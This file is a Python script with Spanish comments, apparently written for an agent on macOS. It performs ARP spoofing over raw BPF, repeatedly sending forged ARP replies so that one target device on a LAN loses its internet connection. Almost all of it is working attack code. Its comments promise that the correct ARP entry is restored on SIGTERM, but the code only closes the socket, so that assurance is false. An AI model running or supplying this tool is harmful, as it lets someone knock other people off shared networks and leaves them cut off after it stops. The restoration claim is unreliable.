#!/usr/bin/env python3
# arp-cut.py — corta el internet de UN dispositivo de la LAN sin ser el router,
# por ARP spoofing (envenena la tabla ARP del objetivo: le dice que el gateway
# está en la MAC del agente; como el agente no reenvía, el tráfico muere).
# Solo para TU PROPIA red. Requiere root (BPF). macOS.
#
# uso: sudo python3 arp-cut.py <iface> <src_mac> <gw_ip> <target_ip> <target_mac>
# corre hasta que se le mande SIGTERM (entonces restaura mandando el ARP correcto).

import sys, os, struct, fcntl, time, signal

if len(sys.argv) < 6:
    print("uso: arp-cut.py <iface> <src_mac> <gw_ip> <target_ip> <target_mac>")
    sys.exit(1)

iface, src_mac, gw_ip, target_ip, target_mac = sys.argv[1:6]

def mac_b(m):  return bytes(int(x, 16) for x in m.split(":"))
def ip_b(i):   return bytes(int(x) for x in i.split("."))

def open_bpf(ifn):
    BIOCSETIF = 0x8020426c  # _IOW('B', 108, struct ifreq) en macOS
    for n in range(256):
        try:
            fd = os.open("/dev/bpf%d" % n, os.O_RDWR)
        except OSError:
            continue
        try:
            fcntl.ioctl(fd, BIOCSETIF, struct.pack("16s16x", ifn.encode()))
            return fd
        except OSError:
            os.close(fd)
    raise SystemExit("arp-cut: no pude abrir /dev/bpf (¿root?)")

def arp_frame(dst_mac_b, src_mac_b, op, sender_mac_b, sender_ip_b, target_mac_b, target_ip_b):
    eth = dst_mac_b + src_mac_b + b"\x08\x06"
    arp = struct.pack(">HHBBH", 1, 0x0800, 6, 4, op)
    arp += sender_mac_b + sender_ip_b + target_mac_b + target_ip_b
    return eth + arp

fd   = open_bpf(iface)
srcb = mac_b(src_mac)
tb   = mac_b(target_mac)
gwb_ip = ip_b(gw_ip)
tb_ip  = ip_b(target_ip)

# ARP reply "veneno": al objetivo, gateway_ip está en NUESTRA mac
poison = arp_frame(tb, srcb, 2, srcb, gwb_ip, tb, tb_ip)

running = True
def stop(*_):
    global running
    running = False
signal.signal(signal.SIGTERM, stop)
signal.signal(signal.SIGINT, stop)

try:
    while running:
        try: os.write(fd, poison)
        except OSError: pass
        time.sleep(2)
finally:
    # restaurar: no conocemos la MAC real del gateway con certeza, pero un ARP
    # request nuestro fuerza al objetivo a reaprender el gateway correcto.
    try:
        os.close(fd)
    except OSError:
        pass
